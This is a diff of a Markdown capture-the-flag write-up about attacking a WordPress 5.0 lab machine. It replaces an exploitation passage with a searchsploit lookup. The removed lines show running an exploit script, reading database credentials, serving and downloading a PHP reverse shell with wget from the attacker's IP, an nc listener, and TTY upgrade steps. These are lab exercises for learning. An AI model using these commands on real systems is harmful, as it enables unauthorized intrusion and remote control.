@@ -200,68 +200,16 @@ kitty +kitten icat 10.10.18.139-BillySMB_Alice-White-Rabbit.jpg
 
 ### **- Now we can analyze the possibility that the version of WordPress used by this website has a vulnerability.**
 <h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>WORDPRESS 5.0</h2>
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/83050add-a133-4c69-a1c2-a16aa896f308"></picture><br></h3>
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/3465a6a2-122a-4263-b340-324c6cb0f93b"></picture><br></h3>
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/56e2983b-2040-4bca-b424-5b87d7e388c8"></picture><br>This sploit requires to be used with python3</h3>
+
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/13a8dff9-f003-43ab-b82c-aac5f86a62c6"></picture><br></h3>
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/994e2ae1-ba00-4243-b18e-cd161d871c98"></picture><br></h3>
 
 ```bash
-python3 50477.py -u http://10.10.69.210
+searchsploit wordpress 5.0
 ```
-
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/15024ded-0f9f-437b-af24-54ddbfbb0f33"></picture><br>We are in</h3>
-
-### **- Let's remember some information about the web**
-
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e36381fe-462b-4ed6-9cba-6610340c2d2c"></picture><br></h3>
-
-```
-cat fuel/application/config/database.php 
-```
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/bbe86f48-8313-45b8-b772-a82bb9783dff"></picture><br>We already have root credentials</h3>
-
-### **- looking for the flags:**
 ```bash
-ls /home/www-data
-cat /home/www-data/flag.txt
+searchsploit → Runs the SearchSploit tool, which searches a local database of known exploits.
+wordpress 5.0 → Searches for exploits specifically related to WordPress version 5.0.
 ```
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/a5a8a433-dc0d-4c85-9ddd-6fc57539a415"></picture><br></h3>
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/f57686c8-2894-474c-9662-6e33f048d80b"></picture><br>Even though we have the root credentials we do not have access to</h3>
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/1b6d092b-aa32-4a8a-aae0-a4ec0994fd62"></picture><br>This has the same code EDB-ID 49512 and also uses python for its execution.</h3>
 
-### **- Now we will create a reverse shell that will give us access from the terminal of our attacking machine:**
-
-```bash
-https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
-```
-
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/f1c71928-734c-46a5-a28a-1b53d5fb914e"></picture><br>We are going to go to the web previously mentioned and copy the code changing the selected lines in the image, we will call this file “shell.php”.</h3>
-
-### **- From our attacking machine we will create an http server with python to upload our file to the compromised machine.**
-
-```bash
-python3 -m http.server 80
-```
-
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/16e6c3b5-bcb4-4d80-b994-081d16ce2f4b"></picture><br></h3>
-
-### **- From the victim machine we download the file**
-
-```bash
-wget http://10.21.118.81/shell.php
-```
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/091c55c7-4eab-4c3c-9218-0ee4cec7527e"></picture><br></h3>
-
-### **- From our attacking machine we will listen on the assigned port**
-
-```bash
-nc -nlvp 444
-```
-```
-treatment of tty
-script /dev/null -c bash
-"CTRL+Z"
-stty raw -echo; fg
-reset xterm
-export TERM=xterm
-export SHELL=bash
-```
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/f28fe028-5533-44b7-8742-89ea78218a6c"></picture><br>We are in like a root</h3>
